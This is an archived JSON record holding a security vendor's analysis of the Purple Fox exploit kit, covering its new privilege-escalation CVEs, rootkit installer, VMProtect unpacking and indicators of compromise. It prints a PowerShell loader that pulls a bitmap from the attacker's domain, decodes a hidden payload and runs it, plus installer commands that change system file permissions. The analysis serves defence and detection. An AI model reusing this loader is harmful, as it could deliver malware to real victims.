{
    "id": "cfa3201a-c6c0-4f54-9e85-7ce0149e623b",
    "created_at": "2023-01-12T15:07:55.057706Z",
    "updated_at": "2025-03-27T02:05:46.142512Z",
    "deleted_at": null,
    "sha1_hash": "4e6b82c96c7908cc05174f5ee0be7ed11669b347",
    "title": "2020-10-19 - Purple Fox EK - New CVEs, Steganography, and Virtualization Added to Attack Flow",
    "authors": "",
    "file_creation_date": "2022-05-28T04:46:59Z",
    "file_modification_date": "2022-05-28T04:46:59Z",
    "file_size": 3085688,
    "plain_text": "# Purple Fox EK | New CVEs, Steganography, and Virtualization Added to Attack Flow\n\n**[labs.sentinelone.com/purple-fox-ek-new-cves-steganography-and-virtualization-added-to-attack-flow/](https://labs.sentinelone.com/purple-fox-ek-new-cves-steganography-and-virtualization-added-to-attack-flow/)**\n\nGal Kristal\n\n## Executive Summary\n\nIn recent weeks, we have seen a spike in the number of attempts to attack vulnerable\nversions of Internet Explorer by actors leveraging the Purple Fox exploit kit.\nOur investigations reveal that Purple Fox has iterated to include use of two recent\nCVEs – CVE-2020-1054 and CVE-2019-0808 – through publicly-available exploit code.\nIn addition, we’ve noticed other changes to their attack flow that allow them to better\ncircumvent firewall protections and some detection tools by adopting steganography\nand obscuring malicious code with code virtualization technologies.\n\nDuring the last couple of years, Purple Fox has advanced its attack and delivery methods.\nFirst [observed in September 2018, subsequent researchers noted that in 2019 Purple Fox](https://blog.360totalsecurity.com/en/purple-fox-trojan-burst-out-globally-and-infected-more-than-30000-users/)\ndropped use of NSIS (Nullsoft Scriptable Install System) and the Rig exploit kit and instead\nadopted PowerShell to achieve fileless execution. Earlier this year, ProofPoint [detailed how](https://www.proofpoint.com/us/blog/threat-insight/purple-fox-ek-adds-exploits-cve-2020-0674-and-cve-2019-1458-its-arsenal)\nPurple Fox added CVE-2020-0674 and CVE-2019-1458 to its arsenal. Our research reveals\nthat the developers have iterated again, adding more CVEs to achieve privilege escalation,\nas well as adopting steganographic and virtualization techniques to avoid detection and\nhamper analysis.\n\n\n-----\n\n## Payload Delivery Flow\n\nIn the attacks we observed, the victim is directed to a malicious site by advertisements or just\nby clicking the wrong URL. The attackers are hosting their malware on\nspeedjudgmentacceleration[.]com and targeting Internet Explorer users.\n\n[The exploit runs mshta.exe with VBScript code as a command line, which then runs](https://lolbas-project.github.io/lolbas/Binaries/Mshta/#execute)\nPowerShell. The PowerShell code downloads and executes in memory the next stage of\ncode from\n```\nhttp[:]//rawcdn[.]githack[.]cyou/up.php?key=1 .\n\n```\n\n-----\n\nFigure 1: An in-the-wild autonomous detection of the attack by the SentinelOne agent\nThe next stage follows a similar pattern to previous versions of Purple Fox. It first checks\nwhether it is running with Administrator privileges or not. If so, it installs an MSI package\ndirectly from the attacker’s site as key=2. Otherwise, it tries several different Local Privilege\nEscalation exploits to elevate itself first.\n\n## New Privilege Escalation Exploits\n\nIn the latest variant of Purple Fox, the attackers have improved two things.\n\nIn the past, Purple Fox would download local privilege escalation (LPE) binaries that used an\nimage file extension ( update.jpg) but which was in fact a regular executable file. This\ntechnique can easily be detected as malicious by an appropriate firewall rule or security\nsoftware.\n\nThe new version of the exploit kit now downloads actual image files (key=3 & key=4) and\nuses steganography to embed each LPE in the image. An example of one of the images\nused is shown below:\n\n\n-----\n\nAfter download, this is then extracted in memory. The following code is used to decode and\nrun the payload:\n```\n$uyxQcl8XomEdJUJd='sal a New-Object;Add-Type -A System.Drawing;$g=a\nSystem.Drawing.Bitmap((a\nNet.WebClient).OpenRead(\"http[:]//rawcdn[.]githack[.]cyou/up.php?key=3\"));$o=a Byte[]\n589824;(0..575)|%{foreach($x in(0..1023)){$p=$g.GetPixel($x,$_);$o[$_*1024+$x]=\n([math]::Floor(($p.B-band15)*16)-bor($p.G -band\n15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..589362]))'\nIEX ($uyxQcl8XomEdJUJd)\n\n```\nFurther, two new exploits are now being utilized to help with local privilege escalation: CVE2020-1054 and [CVE-2019-0808. Both are kernel exploits in the Win32k component. CVE-](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0808)\n2020-1054 was patched as recently as May this year. The attacker binaries we discovered\nexploiting these vulnerabilities were compiled on 11 August 2020 and 10 September 2020,\nrespectively.\n\nThe exploits contain debug information and a lot of informative strings. For example, the\ndebug path on CVE-2020-1054 is:\n```\nD:PersonalWindowsWindows10DesktopCVE-2020-1054-masterCVE-2020-1054masterx64ReleaseCVE-2020-1054.pdb\n\n```\n\n-----\n\nAs the folder name where it was compiled suggests, the code was taken from a Git\nrepository. We were able to quickly trace the exploits to these public repositories: CVE-20201054, [CVE-2019-0808.](https://github.com/DreamoneOnly/CVE-2019-0808-32-64-exp/blob/master/CVE-2019-0808/main.cpp)\n\nUnfortunately, searching for more binaries in the wild with similar traits has so far yielded no\nresults.\n\nIt is worth noting that all of the scripts check for a specific and consistent registry value\nnamed “StayOnTop” under HKCUSoftware7-Zip. It appears that setting this value enables\nthe malware to determine if the payload ran successfully. Therefore, finding this value in a\ncomputer’s registry indicates compromise by Purple Fox.\n\n## Rootkit Payload\n\nThe purpose of the PowerShell scripts and privilege escalation exploits is ultimately to install\na rootkit on the machine. The rootkit’s installation process and capabilities have already been\n[described in detail by other researchers; however, in light of the changes we discovered, we](https://blog.360totalsecurity.com/en/purple-fox-trojan-burst-out-globally-and-infected-more-than-30000-users/)\nwanted to check whether there were any new developments with regard to the payload, too.\n\nWe found two versions of their malware referenced in the new domain, both of which are MSI\ninstallers of the rootkit. One of these has missing files; however, our analysis of the complete\none had some interesting surprises.\n\nThe installation process remains mostly the same. We still see the use of\n[PendingFileRenameOperations for placing the files under the](https://qtechbabble.wordpress.com/2020/06/26/use-pendingfilerenameoperations-registry-key-to-automatically-delete-a-file-on-reboot/) `system32 directory after a`\nreboot. However, the [CustomAction table in the MSI package has vbscript code that among](https://docs.microsoft.com/en-us/windows/win32/msi/customaction-table)\nother things, runs the following:\n```\nvbs.Run \"takeown /f %windir%system32jscript.dll\",0,True\nvbs.Run \"cacls %windir%system32jscript.dll /E /P everyone:N\",0,True\nvbs.Run \"takeown /f %windir%syswow64jscript.dll\",0,True\nvbs.Run \"cacls %windir%syswow64jscript.dll /E /P everyone:N\",0,True\nvbs.Run \"takeown /f %windir%system32cscript.exe\",0,True\nvbs.Run \"cacls %windir%system32cscript.exe /E /P everyone:N\",0,True\nvbs.Run \"takeown /f %windir%syswow64cscript.exe\",0,True\nvbs.Run \"cacls %windir%syswow64cscript.exe /E /P everyone:N\",0,True\nvbs.Run \"powershell Start-Sleep -Seconds 900; Restart-Computer -Force\",0,false\n\n```\n[What’s interesting here is that these commands are straight from Microsoft’s advisory about](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/ADV200001)\nhow to defend against the CVE-2020-0674 vulnerability (Internet Explorer RCE), which is\nused by Purple Fox to gain inital access. We surmise that the purpose of protecting the\nnewly infected machine from that vulnerability may be to keep out rival attackers.\n\nAfter extracting the malware from the MSI package, we noticed that the payload also has a\n[significant new feature: it is now protected by VMProtect.](https://vmpsoft.com/)\n\nUse of VMProtect is easy to observe from the PE’s section table:\n\n\n-----\n\nFigure 2: Entry point\n\nin a “.vmp%d” section is a clear indication of VMProtect\nThis makes reversing more difficult as it employs a number of techniques to hide the original\ncode and obfuscate it.\n\n## Unpacking VMProtect\n\nThere are two primary obstacles to overcome when reversing VMProtected binaries: the\npacked data and the virtualized instructions.\n\n[We first have to unpack the data inside the binary. To do that we used the awesome x64dbg](https://x64dbg.com/)\nand opened the file. After that, we put a breakpoint on the start of the VirtualProtect function:\n\nWe want to log all the calls to that function, so we enter in the “Log Text” box:\n```\nVirtualProtect: lpAddress={a:[esp+4]}, dwSize={d:[esp+8]}, flNewProtect={x:[esp+C]} ;\n\n```\nRunning it until it crashes gives this output:\n```\nVirtualProtect: lpAddress=x86_pf.00401000, dwSize=153444, flNewProtect=40 ;\nPAGE_EXECUTE_READWRITE\nVirtualProtect: lpAddress=x86_pf.00427000, dwSize=1032, flNewProtect=40 ;\nPAGE_EXECUTE_READWRITE\nVirtualProtect: lpAddress=x86_pf.0047D000, dwSize=76, flNewProtect=4 ;\nVirtualProtect: lpAddress=x86_pf.0047E000, dwSize=68, flNewProtect=4 ;\nVirtualProtect: lpAddress=x86_pf.00401000, dwSize=153444, flNewProtect=20 ;\nPAGE_EXECUTE_READ \nVirtualProtect: lpAddress=\"ƒ-\", dwSize=1032, flNewProtect=20 ;\nVirtualProtect: lpAddress=x86_pf.0047D000, dwSize=76, flNewProtect=2 ;\n\n```\n\n-----\n\nWe can see that the data is probably unpacked to virtual address `0x401000, so we ll want`\nto watch that address until data is written there.\n\nAfter restarting the program, we again put a breakpoint on VirtualProtect, and let the\nbreakpoint hit eight times. Then, we set the EIP to that address and use x64dbg’s builtin\nScylla plugin to dump the binary and fix its imports:\n\nThis gives us a much smaller, debuggable DLL file with plenty of plaintext strings to help us\ninvestigate the malware.\n\n[The DLL’s code is still obfuscated using virtualized calls, but fortunately for us we found this](https://oreans.com/CodeVirtualizer.php)\nin the strings:\n\n\n-----\n\n```\nHid_State\nHid_StealthMode\nHid_HideFsDirs\nHid_HideFsFiles\nHid_HideRegKeys\nHid_HideRegValues\nHid_IgnoredImages\nHid_ProtectedImages\n\n```\n[This is similar to previously reported versions of their rootkit, which is just a public rootkit that](https://github.com/JKornev/hidden)\nthey downloaded and compiled. From this information, we deduce that they haven’t\nsubstantially upgraded their capabilities in the rootkit.\n\n## Conclusion\n\nThe Purple Fox exploit kit is under active development. As we’ve seen since September\n2018 and again in our research, the malware authors are keeping up with Microsoft patches\nin order to target those vulnerabilities that organizations and security teams fail to patch in a\ntimely manner by leveraging publicly-available exploit code. This new variant also improves\nits ability to evade detection by adopting steganography to hide LPE binaries and makes use\nof commercially available software to protect its code from analysis.\n\n## Indicators of Compromise\n\n**SHA1**\nc82fe9c9fdd61e1e677fe4c497be2e7908476d64 CVE-2019-1458.exe\ne43f98c0698551f997649c75a2bfe988f72060c0 CVE-2020-1054.exe\n82af45d8c057ef0cf1a61cc43290d21f37838dd1 cve_2019_0808.exe\n6cac8138f1e7e64884494eff2b01c7b1df83aef2 rootkit_from_cve_2019_0808.msi\ne65c1a74275e7099347cbec3f9969f783d6f4f7d cve_2019_0808.ps1\nbdeed6792463713806f39c3b5abc0d56f176e88f key1.bin\n921d1beb3c48b03e20ba1ea07ea1c8f8fc97ec8e key2.bin\n2c5c07c969dd715d0e696f8a8e9e6754a9114d4e key3.bin\n5a680f659c91870a819ede06746f21282a4929d1 key4.bin\n60f2624c39f61ec6c2eff09d463ca57d9a227b9b key5.bin\nbd00f0e6e8cbe0b486fe0aad9e6e38ea606f7044 key6.bin\n9ba5e84fccf1012343ba72e9584c6af3beb8b361 key7.bin\n57b4eac452c2e8c73222d0915a97a63b43d391de key8.bin\n57b4eac452c2e8c73222d0915a97a63b43d391de key9.bin\nc21b1397d25ece8221e981eb5289c592f71ab4ca rootkit_encrypted_payload\n0470d80daf464b5ea5ee80e2db18e0582f6dbfaf rootkit_x86\nbc9766d405913a6162d3747a5a7d0afe1857ac88 rootkit_x64\n\n\n-----\n\n**SHA256**\n079c13fbc30a32e4f0386cd53c56d68404961b8f1cd4d4fde1a1e9def42aa557 CVE-20191458.exe\n7465b738ba31fa2fff7fef1d770ef32e43b01d49a937b3b1c11dc2e4e45fd019 CVE-20201054.exe\nbabfd8e70102479dea4f239c1ee5de463af07c73a94592b390257c5b3d2878a9\ncve_2019_0808.exe\n9208e853d6de61f1640822ae723e0d40730e29cef5a660419b95fd32c84c9ade\nrootkit_from_cve_2019_0808.msi\ne30d7375f5f88847b810755f0a2cda82e8eeb084a3b989c85d6f13f6a1c01f38\ncve_2019_0808.ps1\nb48c61983f2d453d4d6a5ff1f2c9e0e194d7ae892a2649d7bafd267082033748 key1.bin\n49d9f5aaeb6fd10d371afbebf33ffed184b22e66350a12a60cbbe34ff1fadf9e key2.bin\n8392f7bc7bd93ab035e609619e0915b7e8c91288fc6eb19237c0e2019f8dcaa2 key3.bin\n13b0e2769d7a0b3964c4e491f90fc4518f8e5ae4d8c37082ffe764b3a174e9a7 key4.bin\n6bee844cdd424c970ff8bba22385ae4c1ae51c2b4e036ba1a217ba37e100530f key5.bin\ne49327a62e4500ac23fa0b506c565350fbc9afd497198a8b4b8ae8f537146d53 key6.bin\n321eeafe6a9dbd424bf9fdf7ded1ef18c7cab68fadb58cd0da5a1c74479a509f key7.bin\n01662ffa9a1c637307e1d148ac2492c69d6035ca87424cbb11e44a178002abc4 key8.bin\n01662ffa9a1c637307e1d148ac2492c69d6035ca87424cbb11e44a178002abc4 key9.bin\ncfae7a1935f0aaf0f76322f29ad0e0fd1a77d325e55fa324a0bb19e264760800\nrootkit_encrypted_payload\n181551603ebebbf5924247212c0ed93b6c9c4b088e612bf04f5996c227563318 rootkit_x86\n1209aece1f9f54e6422083791eb8a59df878f6959beae9e53736e3056459ab1e rootkit_x64\n\n**Domains**\nspeedjudgmentacceleration[.]com\nrawcdn[.]githack[.]cyou\ndl[.]gblga[.]workers.dev\ndl[.]fmhsi[.]workers.dev\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-10-19 - Purple Fox EK - New CVEs, Steganography, and Virtualization Added to Attack Flow.pdf"
    ],
    "report_names": [
        "2020-10-19 - Purple Fox EK - New CVEs, Steganography, and Virtualization Added to Attack Flow.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536075,
    "ts_updated_at": 1743041146,
    "ts_creation_date": 1653713219,
    "ts_modification_date": 1653713219,
    "files": {
        "pdf": "https://archive.orkl.eu/4e6b82c96c7908cc05174f5ee0be7ed11669b347.pdf",
        "text": "https://archive.orkl.eu/4e6b82c96c7908cc05174f5ee0be7ed11669b347.txt",
        "img": "https://archive.orkl.eu/4e6b82c96c7908cc05174f5ee0be7ed11669b347.jpg"
    }
}